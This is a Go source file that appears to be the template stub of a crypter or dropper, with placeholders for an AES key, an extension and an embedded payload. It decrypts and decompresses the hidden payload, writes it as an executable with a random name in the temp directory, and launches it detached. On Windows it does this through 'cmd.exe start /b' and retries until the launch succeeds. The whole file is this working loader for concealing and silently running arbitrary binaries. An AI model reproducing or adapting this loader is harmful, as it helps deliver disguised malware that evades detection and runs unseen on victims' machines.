package main

import (
	"bytes"
	"compress/zlib"
	"fmt"
	"io"
	"io/ioutil"
	"os"
	"os/exec"
	"path"
	"path/filepath"
	"runtime"
	"time"

	"github.com/pabloskubert/Stub/pkg/aes"

	uuid "github.com/hashicorp/go-uuid"
)

const (
	AES_KEY        = "<KEY>"
	EXT            = "<EXT>"
	GCM_NONCE_SIZE = 12
)

var PAYLOAD = []byte{ /*PAYLOAD*/ }

func main() {
	otpName, _ := uuid.GenerateUUID()
	fullOtp := filepath.Join(os.TempDir(), otpName+EXT)

	nonce := PAYLOAD[:GCM_NONCE_SIZE]
	aes := &aes.AesCrypto{
		Chave: AES_KEY,
	}
	err := aes.NewAesCrypto(nonce)
	if err != nil {
		panic(err)
	}

	rawPayload, err := aes.Decriptar(PAYLOAD[GCM_NONCE_SIZE:])
	if err != nil {
		panic(err)
	}

	b := bytes.NewReader(rawPayload)
	r, _ := zlib.NewReader(b)

	var uncompPayload bytes.Buffer
	_, err = io.Copy(&uncompPayload, r)

	if err != nil {
		panic(err)
	} else {
		r.Close()
	}

	err = ioutil.WriteFile(fullOtp, uncompPayload.Bytes(), 0755)
	if err != nil {
		panic(err)
	}

	// Detached
	switch runtime.GOOS {
	case "linux":
		proc, err := os.StartProcess(fullOtp, []string{fullOtp}, &os.ProcAttr{
			Dir:   path.Dir(fullOtp),
			Env:   os.Environ(),
			Files: []*os.File{os.Stdin, os.Stdout, os.Stderr},
		})

		if err != nil {
			return
		}

		err = proc.Release()
		if err != nil {
			panic(err)
		}
	case "windows":
		for {
			cmd := exec.Command("cmd.exe", "/C", "start", "/b", fullOtp)
			if err := cmd.Run(); err != nil {
				fmt.Printf("Error running proc: %s", err)
			} else {
				fmt.Println("Launched!")
				break
			}

			time.Sleep(time.Second * 15)
		}
	}
}
